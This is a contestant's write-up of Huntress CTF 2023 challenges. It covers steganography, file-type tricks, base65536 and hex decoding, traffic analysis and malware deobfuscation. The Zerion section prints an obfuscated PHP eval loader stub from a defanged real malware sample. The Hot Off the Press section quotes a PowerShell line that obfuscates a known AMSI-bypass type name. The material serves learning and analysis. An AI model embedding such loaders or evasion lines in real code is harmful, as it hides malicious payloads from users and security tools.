# Huntress CTF 2023

## Intro
These are my write ups for the Huntress CTF 2023 challenges. I've already finished a few of the beginner challenges, so I'll go ahead and sum them up, but they may not be as detailed as the rest. The CTF runs the entire month of October, but the challenges are released in batches once a day.

When the challenge is over, I'll update the results section with my standing

## Results

## Challenges

### Read the rules
I accidentally found this one before realizing there was a challenge related to the rules. When I first created my account, I went to the rule page to make sure I didn't miss anything. In the rules it states that there is a flag hidden somewhere on the page. 

After reading through the rules, I hadn't found it, so I viewed the page source and found it hidden as a comment there.

### Technical Support
This one was pretty easy. It's just an introductory flag to teach the contestants how to use the technical support system. 

To get it, just join the discord, verify you are human by reacting to the rules with the specified emoji. This will allow you to see the other pieces of the discord, if you enter the technical support channel, you will see the flag.

### String Cheese
Becuase it's a picture, I figued it was going to be some kind of steganography. So I broke out steghide.

I ran `steghide --extrac -sf cheese.jpg` which prompted me for a password. I obviously didn't have one. Thinking there might be some sort of hint in the prompt, I returned to the website and read it again. The author mentions that their mom used a different name for cheese sticks. This seemed like it might be a hint so I started trying other names like: string, string cheese, etc. I didn't have any luck with this, so I looked online for other names but couldn't find anything I hadn't already tried.

My next idea was to look for passwords or flags in the metadata. Using `exiftool cheese.jpg` I was able to view a lot of info, but there was nothing that stood out.

Finally, I used `xxd cheese.jpg` to view the hex dump for the file. Hidden in the seeming jumble of characters, I foudn the exif data, and right above it was the flag.

### Notepad
This one was very straight forward. I downloaded the file and opened it in notepad. The flag was there in plaintext.

### Book by its Cover
The file downloaded for this challenge was a .rar file. My first instinct was attempt to extract the contents. When I tried that, I got an error basically saying that the file was not supported. This, along with the title of the challenge, made me think that it was just mislabeled as a .rar.

I ran `file book.rar` to find out what it really was. Turns out it was actually a .png. So I changed the file extension and opened it in an image viewer. The image was of the flag.

### Query Code
My first move was to `cat query_code` but this jsut output a bunch of gobbledygook.

So then I used `file query_code` to see if I could learn anything else about it. It seems to think that this is a .png.  As in the 'Book by its Cover' challenge, I tried changing the file to a .png and opening it with an image viewer. I found a QR Code! 

Using my phone, I scanned the QR code to get the flag. (Note: this is a security company and I figured I could trust their QR code, but it's probably not a good idea to scan unknown QR codes in the wild.)

### BaseFFFF+1
The prompt seems to allude to decoding the file using another base. Probably BaseFFFF+1. 

FFFF in hexadecimal = 65535 in decimal. 65535 + 1 = 65536. So I think we are boing to decode using 65536. Now I just needed to find out how to decode with that base.

Online, I found [this repository](https://github.com/Parkayun/base65536) that somebody creatd to encode & decode base65536 using python. After installing this with pip, I wrote this small python script to decode our file:

```
import base65536

file = open("baseffff1","r")

toBeDecoded = file.read()

print(base65536.decode(toBeDecoded))
```

This gave me this message (flag redacted of course):
`b'Nice work! We might have played with too many bases here... 0xFFFF is 65535, 65535+1 is 65536! Well anyway, here is your flag:\r\n\r\nflag{INSERT_FLAG_HERE}'`

### Traffic
Looks like we're analyzing network traffic. I was thinking I could just use wireshark which I'm comfortable with, but it's not the right file type. The prompt suggests using Rita or Zeek.

I chose to try Rita.

Rita stands for Real Intelligence Threat Analytics and is a framework to analyze network traffic to look for malicious traffic.

The hardest part of this challenge was setting up Rita in WSL. I'll go over those steps since that's what took the longest.

1. Download the [repo](https://github.com/activecm/rita.git) from GitHub
2. If  you are on supported OS use the install.sh script to install `sudo ./install.sh` Theoretically you could use --disable-zeek to save some time.
3. WSL is kind of supported for debian. You will see an error about systemd not being usable or something. This is becuase WSL uses some other mechanism. We'll get past this issue in a minute.
4. Modify /etc/rita/config.yaml to include the correct address for your local subnet

If you try to use rita import \<log directory\> at this point, you will get and error saying the databases can't be reached. This is because MongoDB could not be setup to automatically run.

5. Run `sudo mongod` to start the MongoDB server. (Put in background or open another terminal)
6. Now run `rita import \<log directory\> \<name of new DB\>`

It should now work, the logs will be analyzed (Note rita can handle the .gz files so no need to extract them)

7. `rita html-report \<name of DB\>`

You can now view the html report by opening the generated index.html file in your browser.

The trick to this CTF is to look through each line searching for  "sketchy site". In the "Beacons SNI" tab of the report you can see the website names and looking through the list we see "sketchysite.github.io".

Going to this site produces the flag

### CeaserMirror
The prompt here gives the hint that it is a clever ROT13. So I took the contents of the file and dropped them into CyberChef, chose ROT13, and baked it.

The output was half readable, but the other half was backwards. Rather than try to flip the text to make it easier to read, I just started to read it backwards.

You have to start with the firts forward-facing line, and when you get to the backwards piece, start reading from the very end. It's kind of a fun exercise, if a little slow going. The flag has been split into three parts and the parts in the backwards text will have to be reversed in the actual flag.

### I Won't Let You Down
Okay, so this one took me much longer than it should have. I went to the website and watched the video. The website basically tells you to use nmap. So I did that and found 4 ports open:

```
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
646/tcp  filtered ldp
8888/tcp open     sun-answerbook
```

The first 3 look normal to me, and I know the CTF said don't use ssh. So my immediate thought was to try going to port 8888. It didn't load in the browser, or at least it just spun, so I decided to try to just use curl. 

Curl gave me an error saying http 0.9 isn't allowed. When I looked this error up, I found people saying to check if wget gave you more. 

When I ran wget on that port, it started fetching an html file. I let this download for a while before I decided it was probably just spinning. But when I checked the html file I had pulled down, it contained the lyrics to the song and at the very end the flag.

### Zerion
This is the first "Malware Analysis" challenge of the competition and I'm pretty excited. I haven't done much malware analysis to this point, but it's always been something I'm super interested in.

So I downloaded the file onto my VM and then cut the network to it to make sure I was being at least a little safe. There was a warning in the challenge that this is based on a real malware sample that they have defanged, but they still urge us to use caution. I think that is so cool.

So my first step was to run `file` on the file to see what it actually is. It's a php script. 

I then used `cat zerion` to find out what is in the script to see if I can find out what they are doing. This returned a massive jumble of characters that started with this a intelligible text:

```
<?php $L66Rgr=explode(base64_decode("Pz4="),file_get_contents(__FILE__)); $L6CRgr=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($L66Rgr[1]))));$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);exit();?>
```

This was followed by the seemingly gobbledygook. I have left it out since it's partly real malware. But we'll come back to it soon.

I recognized a few things right off the bat: the php heading, a couple of variables, some encoding, etc.

I broke it into it's variables to decipher what is going on.

$L66Rgr is pretty easy to decipher. It's creating an array from a string using the explode function, the delimeter is just encoded in base64 but it turns out it is "?>". The string to be broken is loaded using file_get_contents and is using this php file. So it's grabbing that log string of gobbledygook.

$L6CRgr is an array. The first two entries are just base64 encoded as well so quickly decoded to be /x/i, and x. The last entry was a little more fun. It's a combination of a few different obfuscation techniques.

`base64_decode(strrev(str_rot13($L66Rgr[1])))`

So it's referring back to the gobbledygook. I dropped it into cyberchef and then worked backwards on obfuscation methods. Rot13 -> reverse order -> base64 decode. Now I see it is actually a rather large chunk of code.

$L7CRgr is just a string. Nothing special there yet. I'm sure we'll get to using it.

Then the script calls `preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);` before finishing.

This referes back to our previous work. preg_replace is a php function that uses a pattern to serach and replace a string. It is case-insensitive. And is called like so:

`preg_replace(<Pattern>,<Replacement String>,<String to act upon>)`


So the pattern we are searching for is the first entry of $L6CRgr which is /x/i  
We are replacing it with the serialized version of the gobbledygook (evaluated as php code), and the string to be replaced is x. Interesting. I'm not exactly sure what this will do, because from what I can tell it's replacaing things in string 'x' which doesn't exist. At least not that I can see at this point. Maybe I'll come back to it.

Coming back to $LCRgr, I see it in the php function that we have already decoded, so I drop it's value in.

Then I just have to decode the php function I have found.

For my sanity, I like to start out by making the code more readable by stylizing it. I just go through and add returns and indents in ways that make sense for reading softare. For example, after a semi-colon, there will be a return, curly brackets should be lined up with the corresponding bracket, etc. 

As I went through the code doing this, I stumbled across the flag!


### Human Two
First step here for me was unzipping into another directory.

It's 1000 files all with giant names. They all look very similiar. Using the diff command, I can see that in all the files I checked there is just one difference. Basically a string in each. Maybe an ID or soemthing.

However, the prompt states that they are mostly the same except for a few oddities. So decided I needed a simple script that basically takes all the files in the directory and compares them to the first. Becuase I'm in a bit of a hurry, I decided to practice my prompt engineering skills and let ChatGPT generate this script for me:

```
#!/bin/bash

# Check if a directory is provided as an argument
if [ $# -ne 1 ]; then
    echo "Usage: $0 <directory>"
    exit 1
fi

directory="$1"
files=("$directory"/*)

# Check if the directory is empty
if [ ${#files[@]} -lt 1 ]; then
    echo "Directory is empty."
    exit 1
fi

# Get the first file in the directory
first_file="${files[0]}"

# Loop through each file in the directory
for file in "${files[@]}"; do
    # Compare the current file with the first file using diff
    diff "$first_file" "$file"
    # Add a separator between comparisons
    echo "----------------------------------------"
done
```
kt
I read throught the script to make sure it would do what I wanted it to and ran it. The output from this script was quite large, but scrolling through I did find an oddity.

```
if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000")) {
134c134
```

This was found in the cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19 file (line 36).

So I opened that file to investigate to see if I could find out what was happening there. But that didn't seem like it was very much of a lead. So instead I started to think more about the numbers that are there.

Could they be encoded? Are they related to the other files? Maybe they correlate to the ID's that I found earlier. I grep'd through the files searching for each of these ID looking things, but to no avail.

Okay, so that leaves my encoded idea. I took one of the values out and through it cyber chef. I noticed it had low entropy, but it didn't immediately give me any valuable decoding. It didn't look like base64 to me, but I tried that anyway. Didn't work. Finally, I realized that maybe if I followed the string concatenation in the script it would give me a better picture. So I concatenated them all together to get:

`666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d-0000-0000-000000000000`

For whatever reason, after I did this, I realized the pattern looked somewhat familiar. Particularly the small blocks, looked kind of like hex to me, so I decoded it from hex on cyber chef and found the flag followed by a bunch of null characters.

### Hot Off the Press
Another malware analysis challenge, yay! 

The challenge prompt mentions it is some kind of weird archive but I figure I need to start out just like I did with Human2, that is extracting it from the archive so I could view it's contents. The question is what kind of archive is it. Using `file` I found that it was a UHarc archive. I had no idea what that was so I went and looked it up. Apparently it's another compression (.uha) that was designed for windows. So I now need to find a program to decompress this format, but my VM is not a Windows VM. My research showed that basically I would have to use a decompression client using Wine. But I didn't want to go to all that work so I just created a shared directory between a Windows machine and my Linux VM where I wanted to do the rest of the work. This way I could extract it and share the file then remove the shared folder to keep my VM isolated.

I searched the web and found WinUHA which can extract .uha files. But when I went to extract hot_off_the_press it wouldn't work. Turns out the program was just looking for a .uha file, so I added teh file extension myself. Then the program could extract it using the password given in the prompt. I ended up with a powershell script. At this point Windows Defender started going crazy becuase it found the extracted Trojan. I had to tell Windows Defender that the thread was allowed before I could do anythign with it. After allowing it, I moved it to my VM and and disconnected the access. Then I went back to defender and told it to remove the threat, after which I uninstalled WinUHA and ran a scan just for good measure.

Okay, now that the extraction work was over, I had a powershell script safely in my VM. Time to start analyzing.

As with the other Malware Analysis we've done so far in this challenge, I started by working through the code to make it readable for my sake. Fixing returns and indents so that it wasn't all on one line. Once I had those figured out. I noticed there was a lot of concatenation. So I worked through adding that together with a simple search and replace ''+'' to nothing. Now I can see partial words. they are often broken up like this example for further obfuscation:

`$jXZ4D=[Ref].Assembly.GetType(((''{0}ystem.{1}ana{4}ement.A{5}tomation.{2}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u''));`

In these cases, the letters after the phrase correspond to their own placement number. So in the line above, {0} = S, {1} = M, {2} = U, {3} = l, {4} = g, {5} = u. The -f is just the flag to make this substitution.Once I found this,I went and simplified my readable code by replacing them as necessary. As I was going through doing this. I found a long base64 string that would be decoded on execution. It contained a few of these substitutions, so I copied it out so I had that string alone and used find and replace to fix the substitutions. There were just about 50 substitutions, so this was the fastet way.

I then dropped this newly deobfuscated base64 string into CyberChef base64 decoder but still didn't get anything readable. Looking back at the powershell script, I notice that it is actually a gzip stream. I didn't know you could do this, but I suppose it makes sense. Essentially, what is happening is that we are decoding to a gzip, so if we unzip it we get the readable output. I used

`echo '<Input Base64 Here>' | base64 -d | gunzip`

and got a ton more code. I was going to go through the same readability steps I normally do, but I figured I could just scan for any flags, or base64 encoded strings. I didn't find a flag, but I did find another base64 encoded string. Decoding it gave me a URL with a parameter encoded_flag=\<Percent Encoded String\>. I had a suspicion that this was probably the flag, so I dropped the encoded string into CyberChef and used URL Decode to decoded the percent encoded values. And, as I suspected, it was the flag.

